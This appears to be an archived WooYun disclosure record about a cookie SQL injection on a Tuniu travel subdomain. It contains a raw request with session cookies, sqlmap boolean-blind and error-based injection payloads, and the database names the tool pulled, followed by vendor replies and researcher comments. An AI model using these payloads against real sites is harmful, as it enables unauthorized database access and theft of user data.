{"id": 16700, "wybug_id": "wooyun-2012-013828", "wybug_title": "途牛旅游网cookie注入漏洞", "wybug_corp": "途牛旅游网", "wybug_author": "AttackSir", "wybug_date": "2012-10-24 09:38", "wybug_open_date": "2012-10-29 09:39", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-10-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-10-29：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 访问首页链接查看提交消息，发现链接参数随cookie提交。对参数进行fuzz发现存在cookie注入漏洞，此问题比较严重，希望给与重视。 详细说明：  GET /zhoubian/leyuan/ HTTP/1.1Host: sy.tuniu.comUser-Agent: Mozilla/5.0 (X11; Linux i686; rv:16.0) Gecko/20100101 Firefox/16.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateProxy-Connection: keep-aliveReferer: http://sy.tuniu.com/tours/311094Cookie: tuniuuser_citycode=MTkwMg%3D%3D; tuniu_channel=MTAwLDAsZDdiY2U0NTViYjViMDFhNWExYzk1YTM2ZjZiNDEyY2Q%3D; visit_history=311094; PHPSESSID=aq8r0pudtjl3t61vkss0i563o3DNT: 1Cache-Control: max-age=0测试发现参数visit_history=311094存在cookie注入漏洞   漏洞证明：  \n\nsqlmap identified the following injection points with a total of 210 HTTP(s) requests:---Place: CookieParameter: visit_history    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: tuniuuser_citycode=MTkwMg%3D%3D; tuniu_channel=MTAwLDAsZDdiY2U0NTViYjViMDFhNWExYzk1YTM2ZjZiNDEyY2Q%3D; visit_history=311094) AND 4608=4608 AND (9847=9847; PHPSESSID=aq8r0pudtjl3t61vkss0i563o3    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: tuniuuser_citycode=MTkwMg%3D%3D; tuniu_channel=MTAwLDAsZDdiY2U0NTViYjViMDFhNWExYzk1YTM2ZjZiNDEyY2Q%3D; visit_history=311094) AND (SELECT 3540 FROM(SELECT COUNT(*),CONCAT(0x3a79756b3a,(SELECT (CASE WHEN (3540=3540) THEN 1 ELSE 0 END)),0x3a6878653a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (5085=5085; PHPSESSID=aq8r0pudtjl3t61vkss0i563o3---[11:03:27] [INFO] the back-end DBMS is MySQLweb server operating system: Linux CentOSweb application technology: PHP 5.3.3, Apache 2.2.15back-end DBMS: MySQL 5.0[11:03:27] [INFO] fetching database names[11:03:27] [WARNING] the SQL query provided does not return any output[11:03:27] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' and/or switch '--hex'[11:03:27] [INFO] fetching number of databases[11:03:27] [INFO] retrieved: 3[11:03:31] [INFO] retrieving the length of query output[11:03:31] [INFO] retrieved: 18[11:03:50] [INFO] retrieved: information_schema             [11:03:50] [INFO] retrieving the length of query output[11:03:50] [INFO] retrieved: 4[11:03:59] [INFO] retrieved: test           [11:03:59] [INFO] retrieving the length of query output[11:03:59] [INFO] retrieved: 5[11:04:09] [INFO] retrieved: tuniu           available databases [3]:[*] information_schema[*] test[*] tuniu[11:04:10] [WARNING] HTTP error codes detected during testing:500 (Internal Server Error) - 202 times[11:04:10] [INFO] fetched data logged to text files under '/pentest/database/sqlmap/output/sy.tuniu.com'-------------------------------------------------------------使用sqlmap获取数据库信息available databases [3]:[*] information_schema[*] test[*] tuniu没继续深做了，问题比较多，有时间再往乌云上放吧~~   修复方案：  参数过滤   版权声明：转载请注明来源 AttackSir@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2012-10-29 09:39 厂商回复：  最新状态： 2012-10-30：已修复，感谢@AttackSir，没能及时认领，抱歉  ", "replys": "漏洞评价：\n评论\n     2012-10-29 14:26 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:687 漏洞数:78        | 铁甲依然在)\t\t \n  我擦，怎么忽略了=-=~    \n     2012-10-29 18:21 |    \t\tRona \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:23        | test)\t\t \n  @瘦蛟舞 测试没成功。测试细节。cookie里面字段不存在    \n     2012-10-29 18:58 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:687 漏洞数:78        | 铁甲依然在)\t\t \n  @Rona 我也没找到这cookie字段=-=~你把我当这个洞主了？    \n     2012-10-29 23:41 |    \t\tAttackSir \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:4        | 此人比较懒，什么都没有留下。哇咔咔)\t\t \n  Tuniu数据库下500多个表，太大了没粘上来。如果人家觉得可以忽略就忽略吧。    \n     2012-10-29 23:50 |    \t\tAttackSir \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:4        | 此人比较懒，什么都没有留下。哇咔咔)\t\t \n  @瘦蛟舞 细节在详细说明中，请参考提交信息编写sqlmap测试语句，我这里就不公开写了，给tuniu保留点隐私。    \n     2012-10-30 00:00 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:687 漏洞数:78        | 铁甲依然在)\t\t \n  @AttackSir =-=！是500多个表。。150W用户。。看来我发的那个也要被忽略了。。。蛋疼。。。    \n     2012-12-05 15:50 |    \t\t途牛旅游网(乌云厂商)\t\t \n  感谢各位发现的漏洞，问题已经修复    \n     2014-02-15 22:53 |    \t\tsec_jtn \t\t\t( 普通白帽子  |\t\t\t        Rank:134 漏洞数:56        | 本想无耻的刷rank，最后发现是我想太多了。...)\t\t \n  厂商回复亮了。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}